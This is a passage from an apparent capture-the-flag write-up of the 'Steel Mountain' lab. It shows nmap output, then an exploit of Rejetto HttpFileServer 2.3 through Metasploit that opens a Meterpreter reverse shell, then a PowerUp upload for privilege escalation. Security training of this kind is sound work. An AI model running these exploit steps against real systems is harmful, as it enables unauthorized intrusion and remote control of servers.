</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_ssl<span style=color:#f92672>-</span>date: <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>24</span>T02:<span style=color:#ae81ff>59</span>:<span style=color:#ae81ff>56</span><span style=color:#f92672>+</span><span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>00</span>; <span style=color:#ae81ff>0</span>s <span style=color:#f92672>from</span> scanner time<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>5985</span><span style=color:#f92672>/</span>tcp  open  http               syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>125</span> Microsoft HTTPAPI httpd <span style=color:#ae81ff>2.0</span> (SSDP<span style=color:#f92672>/</span>UPnP)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>server<span style=color:#f92672>-</span>header: Microsoft<span style=color:#f92672>-</span>HTTPAPI<span style=color:#f92672>/</span><span style=color:#ae81ff>2.0</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>title: Not Found
</span></span><span style=display:flex><span><span style=color:#ae81ff>8080</span><span style=color:#f92672>/</span>tcp  open  http               syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>125</span> HttpFileServer httpd <span style=color:#ae81ff>2.3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>server<span style=color:#f92672>-</span>header: HFS <span style=color:#ae81ff>2.3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> http<span style=color:#f92672>-</span>methods: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  Supported Methods: GET HEAD POST
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>favicon: Unknown favicon MD5: <span style=color:#ae81ff>759792</span>EDD4EF8E6BC2D1877D27153CB1
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>title: HFS <span style=color:#f92672>/</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>47001</span><span style=color:#f92672>/</span>tcp open  http               syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>125</span> Microsoft HTTPAPI httpd <span style=color:#ae81ff>2.0</span> (SSDP<span style=color:#f92672>/</span>UPnP)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>title: Not Found
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>server<span style=color:#f92672>-</span>header: Microsoft<span style=color:#f92672>-</span>HTTPAPI<span style=color:#f92672>/</span><span style=color:#ae81ff>2.0</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>49152</span><span style=color:#f92672>/</span>tcp open  msrpc              syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>125</span> Microsoft Windows RPC
</span></span><span style=display:flex><span><span style=color:#ae81ff>49153</span><span style=color:#f92672>/</span>tcp open  msrpc              syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>125</span> Microsoft Windows RPC
</span></span><span style=display:flex><span><span style=color:#ae81ff>49154</span><span style=color:#f92672>/</span>tcp open  msrpc              syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>125</span> Microsoft Windows RPC
</span></span><span style=display:flex><span><span style=color:#ae81ff>49155</span><span style=color:#f92672>/</span>tcp open  msrpc              syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>125</span> Microsoft Windows RPC
</span></span><span style=display:flex><span><span style=color:#ae81ff>49156</span><span style=color:#f92672>/</span>tcp open  msrpc              syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>125</span> Microsoft Windows RPC
</span></span><span style=display:flex><span><span style=color:#ae81ff>49169</span><span style=color:#f92672>/</span>tcp open  msrpc              syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>125</span> Microsoft Windows RPC
</span></span><span style=display:flex><span><span style=color:#ae81ff>49170</span><span style=color:#f92672>/</span>tcp open  msrpc              syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>125</span> Microsoft Windows RPC
</span></span><span style=display:flex><span>Service Info: OSs: Windows, Windows Server <span style=color:#ae81ff>2008</span> R2 <span style=color:#f92672>-</span> <span style=color:#ae81ff>2012</span>; CPE: cpe:<span style=color:#f92672>/</span>o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> smb2<span style=color:#f92672>-</span>security<span style=color:#f92672>-</span>mode: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>302</span>: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_    Message signing enabled but <span style=color:#f92672>not</span> required
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> p2p<span style=color:#f92672>-</span>conficker: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Checking <span style=color:#66d9ef>for</span> Conficker<span style=color:#f92672>.</span>C <span style=color:#f92672>or</span> higher<span style=color:#f92672>...</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Check <span style=color:#ae81ff>1</span> (port <span style=color:#ae81ff>33062</span><span style=color:#f92672>/</span>tcp): CLEAN (Couldn<span style=color:#e6db74>&#39;t connect)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Check <span style=color:#ae81ff>2</span> (port <span style=color:#ae81ff>19020</span><span style=color:#f92672>/</span>tcp): CLEAN (Couldn<span style=color:#e6db74>&#39;t connect)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Check <span style=color:#ae81ff>3</span> (port <span style=color:#ae81ff>53324</span><span style=color:#f92672>/</span>udp): CLEAN (Timeout)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Check <span style=color:#ae81ff>4</span> (port <span style=color:#ae81ff>25253</span><span style=color:#f92672>/</span>udp): CLEAN (Failed to receive data)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  <span style=color:#ae81ff>0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>4</span> checks are positive: Host <span style=color:#f92672>is</span> CLEAN <span style=color:#f92672>or</span> ports are blocked
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> smb<span style=color:#f92672>-</span>security<span style=color:#f92672>-</span>mode: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   authentication_level: user
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   challenge_response: supported
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  message_signing: disabled (dangerous, but default)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <span style=color:#f92672>&lt;</span>unknown<span style=color:#f92672>&gt;</span>, NetBIOS MAC: <span style=color:#ae81ff>02e7560</span>a719d (unknown)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> Names:
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   STEELMOUNTAIN<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>00</span><span style=color:#f92672>&gt;</span>    Flags: <span style=color:#f92672>&lt;</span>unique<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   WORKGROUP<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>00</span><span style=color:#f92672>&gt;</span>        Flags: <span style=color:#f92672>&lt;</span>group<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   STEELMOUNTAIN<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>20</span><span style=color:#f92672>&gt;</span>    Flags: <span style=color:#f92672>&lt;</span>unique<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> Statistics:
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>02e7560</span>a719d0000000000000000000000
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>0000000000000000000000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  <span style=color:#ae81ff>0000000000000000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> smb2<span style=color:#f92672>-</span>time: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   date: <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>24</span>T02:<span style=color:#ae81ff>59</span>:<span style=color:#ae81ff>50</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  start_date: <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>24</span>T02:<span style=color:#ae81ff>56</span>:<span style=color:#ae81ff>01</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_clock<span style=color:#f92672>-</span>skew: mean: <span style=color:#ae81ff>0</span>s, deviation: <span style=color:#ae81ff>0</span>s, median: <span style=color:#ae81ff>0</span>s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>NSE: Script Post<span style=color:#f92672>-</span>scanning<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>1</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>59</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>59</span>, <span style=color:#ae81ff>0.00</span>s elapsed
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>2</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>59</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>59</span>, <span style=color:#ae81ff>0.00</span>s elapsed
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>3</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>59</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>59</span>, <span style=color:#ae81ff>0.00</span>s elapsed
</span></span><span style=display:flex><span>Read data files from: <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/../</span>share<span style=color:#f92672>/</span>nmap
</span></span><span style=display:flex><span>Service detection performed<span style=color:#f92672>.</span> Please report any incorrect results at https:<span style=color:#f92672>//</span>nmap<span style=color:#f92672>.</span>org<span style=color:#f92672>/</span>submit<span style=color:#f92672>/</span> <span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Nmap done: <span style=color:#ae81ff>1</span> IP address (<span style=color:#ae81ff>1</span> host up) scanned <span style=color:#f92672>in</span> <span style=color:#ae81ff>84.37</span> seconds
</span></span><span style=display:flex><span>           Raw packets sent: <span style=color:#ae81ff>19</span> (<span style=color:#ae81ff>812</span>B) <span style=color:#f92672>|</span> Rcvd: <span style=color:#ae81ff>16</span> (<span style=color:#ae81ff>700</span>B)
</span></span></code></pre></div><h1 id=enumeration>Enumeration
<a class=anchor href=#enumeration>#</a></h1><p>There are a lot of ports open and since port 80 is open we will check what&rsquo;s running on that port.</p><p>There is an image displaying their employee of the month and we can see the name Steel Mountain which might be an organization.</p><p>While opening the image in a new tab we can see the name of the image as Bill Harper.</p><blockquote><p>http://10.10.70.179/img/BillHarper.png</p></blockquote><p>Now, we will check what&rsquo;s running on port 8080. We can see that there is some file server running. Under the server information, there is mentioned that it is HttpFileServer 2.3.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#Server information</span>
</span></span><span style=display:flex><span>HttpFileServer <span style=color:#ae81ff>2.3</span>
</span></span><span style=display:flex><span>Server time: <span style=color:#ae81ff>5</span><span style=color:#f92672>/</span><span style=color:#ae81ff>23</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2024</span> <span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>04</span>:<span style=color:#ae81ff>24</span> PM
</span></span><span style=display:flex><span>Server uptime: <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>07</span>:<span style=color:#ae81ff>51</span> 
</span></span></code></pre></div><p>On clicking that leads us to this page which shows that it is a Rejetto HttpFileServer 2.3.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>fieldset</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;serverinfo&#39;</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>legend</span>&gt;&lt;<span style=color:#f92672>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/~img0&#34;</span>&gt; Server information&lt;/<span style=color:#f92672>legend</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://www.rejetto.com/hfs/&#34;</span>&gt;HttpFileServer 2.3&lt;/<span style=color:#f92672>a</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>br</span> /&gt;Server time: 5/23/2024 8:05:49 PM
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>br</span> /&gt;Server uptime: 00:09:15
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>fieldset</span>&gt;
</span></span></code></pre></div><h1 id=exploitation>Exploitation
<a class=anchor href=#exploitation>#</a></h1><p>We will search in metasploit if we can find any exploits.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>msf6 <span style=color:#f92672>&gt;</span> search rejetto
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Matching Modules
</span></span><span style=display:flex><span><span style=color:#f92672>================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   <span style=color:#75715e>#  Name                                   Disclosure Date  Rank       Check  Description</span>
</span></span><span style=display:flex><span>   <span style=color:#f92672>-</span>  <span style=color:#f92672>----</span>                                   <span style=color:#f92672>---------------</span>  <span style=color:#f92672>----</span>       <span style=color:#f92672>-----</span>  <span style=color:#f92672>-----------</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>  exploit<span style=color:#f92672>/</span>windows<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>rejetto_hfs_exec  <span style=color:#ae81ff>2014</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span><span style=color:#f92672>-</span><span style=color:#ae81ff>11</span>       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Interact <span style=color:#66d9ef>with</span> a module by name <span style=color:#f92672>or</span> index<span style=color:#f92672>.</span> For example info <span style=color:#ae81ff>0</span>, use <span style=color:#ae81ff>0</span> <span style=color:#f92672>or</span> use exploit<span style=color:#f92672>/</span>windows<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>rejetto_hfs_exec
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf6 <span style=color:#f92672>&gt;</span> info <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       Name: Rejetto HttpFileServer Remote Command Execution
</span></span><span style=display:flex><span>     Module: exploit<span style=color:#f92672>/</span>windows<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>rejetto_hfs_exec
</span></span><span style=display:flex><span>   Platform: Windows
</span></span><span style=display:flex><span>       Arch: 
</span></span><span style=display:flex><span> Privileged: No
</span></span><span style=display:flex><span>    License: Metasploit Framework License (BSD)
</span></span><span style=display:flex><span>       Rank: Excellent
</span></span><span style=display:flex><span>  Disclosed: <span style=color:#ae81ff>2014</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span><span style=color:#f92672>-</span><span style=color:#ae81ff>11</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Provided by:
</span></span><span style=display:flex><span>  Daniele Linguaglossa <span style=color:#f92672>&lt;</span>danielelinguaglossa<span style=color:#a6e22e>@gmail.com</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>  Muhamad Fadzil Ramli <span style=color:#f92672>&lt;</span>mind1355<span style=color:#a6e22e>@gmail.com</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><p>We found a module which is successfully tested on the version 2.3b. So, we will use this.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>Description:
</span></span><span style=display:flex><span>  Rejetto HttpFileServer (HFS) <span style=color:#f92672>is</span> vulnerable to remote command execution attack due to a
</span></span><span style=display:flex><span>  poor regex <span style=color:#f92672>in</span> the file ParserLib<span style=color:#f92672>.</span>pas<span style=color:#f92672>.</span> This module exploits the HFS scripting commands by
</span></span><span style=display:flex><span>  using <span style=color:#e6db74>&#39;%00&#39;</span> to bypass the filtering<span style=color:#f92672>.</span> This module has been tested successfully on HFS <span style=color:#ae81ff>2.3</span>b
</span></span><span style=display:flex><span>  over Windows XP SP3, Windows <span style=color:#ae81ff>7</span> SP1 <span style=color:#f92672>and</span> Windows <span style=color:#ae81ff>8.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>References:
</span></span><span style=display:flex><span>  https:<span style=color:#f92672>//</span>nvd<span style=color:#f92672>.</span>nist<span style=color:#f92672>.</span>gov<span style=color:#f92672>/</span>vuln<span style=color:#f92672>/</span>detail<span style=color:#f92672>/</span>CVE<span style=color:#f92672>-</span><span style=color:#ae81ff>2014</span><span style=color:#f92672>-</span><span style=color:#ae81ff>6287</span>
</span></span><span style=display:flex><span>  OSVDB (<span style=color:#ae81ff>111386</span>)
</span></span><span style=display:flex><span>  https:<span style=color:#f92672>//</span>seclists<span style=color:#f92672>.</span>org<span style=color:#f92672>/</span>bugtraq<span style=color:#f92672>/</span><span style=color:#ae81ff>2014</span><span style=color:#f92672>/</span>Sep<span style=color:#f92672>/</span><span style=color:#ae81ff>85</span>
</span></span><span style=display:flex><span>  http:<span style=color:#f92672>//</span>www<span style=color:#f92672>.</span>rejetto<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>wiki<span style=color:#f92672>/</span>index<span style=color:#f92672>.</span>php<span style=color:#960050;background-color:#1e0010>?</span>title<span style=color:#f92672>=</span>HFS:_scripting_commands
</span></span></code></pre></div><p>We will set all the required options.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>set rhost <span style=color:#ae81ff>10.10.70.179</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>set rport <span style=color:#ae81ff>8080</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>set lhost tun0
</span></span></code></pre></div><p>Run the exploit.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>exploit
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>msf6 exploit(windows<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>rejetto_hfs_exec) <span style=color:#f92672>&gt;</span> exploit
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Started reverse TCP handler on <span style=color:#ae81ff>10.6.10.164</span>:<span style=color:#ae81ff>4444</span> 
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Using URL: http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.6.10.164</span>:<span style=color:#ae81ff>8080</span><span style=color:#f92672>/</span>okBb9lTf
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Server started<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Sending a malicious request to <span style=color:#f92672>/</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Payload request received: <span style=color:#f92672>/</span>okBb9lTf
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Sending stage (<span style=color:#ae81ff>175686</span> bytes) to <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>[<span style=color:#960050;background-color:#1e0010>!</span>] Tried to delete <span style=color:#f92672>%</span>TEMP<span style=color:#f92672>%</span>\cGZQGuu<span style=color:#f92672>.</span>vbs, unknown result
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Meterpreter session <span style=color:#ae81ff>1</span> opened (<span style=color:#ae81ff>10.6.10.164</span>:<span style=color:#ae81ff>4444</span> <span style=color:#f92672>-&gt;</span> <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>63844</span>) at <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>23</span> <span style=color:#ae81ff>23</span>:<span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>00</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>0400</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Server stopped<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> sysinfo
</span></span><span style=display:flex><span>Computer        : STEELMOUNTAIN
</span></span><span style=display:flex><span>OS              : Windows Server <span style=color:#ae81ff>2012</span> R2 (<span style=color:#ae81ff>6.3</span> Build <span style=color:#ae81ff>9600</span>)<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Architecture    : x64
</span></span><span style=display:flex><span>System Language : en_US
</span></span><span style=display:flex><span>Domain          : WORKGROUP
</span></span><span style=display:flex><span>Logged On Users : <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Meterpreter     : x86<span style=color:#f92672>/</span>windows
</span></span><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> 
</span></span></code></pre></div><p>We got the meterpreter reverse shell and we can read the user flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> shell
</span></span><span style=display:flex><span>Process <span style=color:#ae81ff>1056</span> created<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Channel <span style=color:#ae81ff>2</span> created<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Microsoft Windows [Version <span style=color:#ae81ff>6.3.9600</span>]
</span></span><span style=display:flex><span>(c) <span style=color:#ae81ff>2013</span> Microsoft Corporation<span style=color:#f92672>.</span> All rights reserved<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<span style=color:#f92672>&gt;</span>cd C:\Users\Bill\Desktop
</span></span><span style=display:flex><span>cd c:\users\bill\desktop
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c:\Users\bill\Desktop<span style=color:#f92672>&gt;</span>dir
</span></span><span style=display:flex><span>dir
</span></span><span style=display:flex><span> Volume <span style=color:#f92672>in</span> drive C has no label<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span> Volume Serial Number <span style=color:#f92672>is</span> <span style=color:#ae81ff>2E4</span>A<span style=color:#f92672>-</span><span style=color:#ae81ff>906</span>A
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> Directory of c:\Users\bill\Desktop
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>09</span><span style=color:#f92672>/</span><span style=color:#ae81ff>27</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>09</span>:<span style=color:#ae81ff>08</span> AM    <span style=color:#f92672>&lt;</span>DIR<span style=color:#f92672>&gt;</span>          <span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>09</span><span style=color:#f92672>/</span><span style=color:#ae81ff>27</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>09</span>:<span style=color:#ae81ff>08</span> AM    <span style=color:#f92672>&lt;</span>DIR<span style=color:#f92672>&gt;</span>          <span style=color:#f92672>..</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>09</span><span style=color:#f92672>/</span><span style=color:#ae81ff>27</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>05</span>:<span style=color:#ae81ff>42</span> AM                <span style=color:#ae81ff>70</span> user<span style=color:#f92672>.</span>txt
</span></span><span style=display:flex><span>               <span style=color:#ae81ff>1</span> File(s)             <span style=color:#ae81ff>70</span> bytes
</span></span><span style=display:flex><span>               <span style=color:#ae81ff>2</span> Dir(s)  <span style=color:#ae81ff>44</span>,<span style=color:#ae81ff>155</span>,<span style=color:#ae81ff>789</span>,<span style=color:#ae81ff>312</span> bytes free
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c:\Users\bill\Desktop<span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h1 id=privilege-escalation>Privilege Escalation
<a class=anchor href=#privilege-escalation>#</a></h1><p>Now, we will elevate our privileges. We will download the powershell script which can find common Windows privilege escalation vectors that rely on misconfigurations in the target. We will first download the script to our machine.</p><p>Let&rsquo;s upload it to the target.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>upload powerup.ps1
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> upload powerup<span style=color:#f92672>.</span>ps1
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Uploading  : <span style=color:#f92672>/</span>root<span style=color:#f92672>/</span>tryhackme<span style=color:#f92672>/</span>powerup<span style=color:#f92672>.</span>ps1 <span style=color:#f92672>-&gt;</span> powerup<span style=color:#f92672>.</span>ps1
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Uploaded <span style=color:#ae81ff>483.26</span> KiB of <span style=color:#ae81ff>483.26</span> KiB (<span style=color:#ae81ff>100.0</span><span style=color:#f92672>%</span>): <span style=color:#f92672>/</span>root<span style=color:#f92672>/</span>tryhackme<span style=color:#f92672>/</span>powerup<span style=color:#f92672>.</span>ps1 <span style=color:#f92672>-&gt;</span> powerup<span style=color:#f92672>.</span>ps1
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Completed  : <span style=color:#f92672>/</span>root<span style=color:#f92672>/</span>tryhackme<span style=color:#f92672>/</span>powerup<span style=color:#f92672>.</span>ps1 <span style=color:#f92672>-&gt;</span> powerup<span style=color:#f92672>.</span>ps1
</span></span><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> load powershell
</span></span><span style=display:flex><span>Loading extension powershell<span style=color:#f92672>...</span>Success<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> powershell_shell
</span></span><span style=display:flex><span>PS <span style=color:#f92672>&gt;</span> dir
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Directory: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode                LastWriteTime     Length Name
</span></span><span style=display:flex><span><span style=color:#f92672>----</span>                <span style=color:#f92672>-------------</span>     <span style=color:#f92672>------</span> <span style=color:#f92672>----</span>
</span></span><span style=display:flex><span>d<span style=color:#f92672>----</span>         <span style=color:#ae81ff>5</span><span style=color:#f92672>/</span><span style=color:#ae81ff>23</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2024</span>   <span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>13</span> PM            <span style=color:#f92672>%</span>TEMP<span style=color:#f92672>%</span>
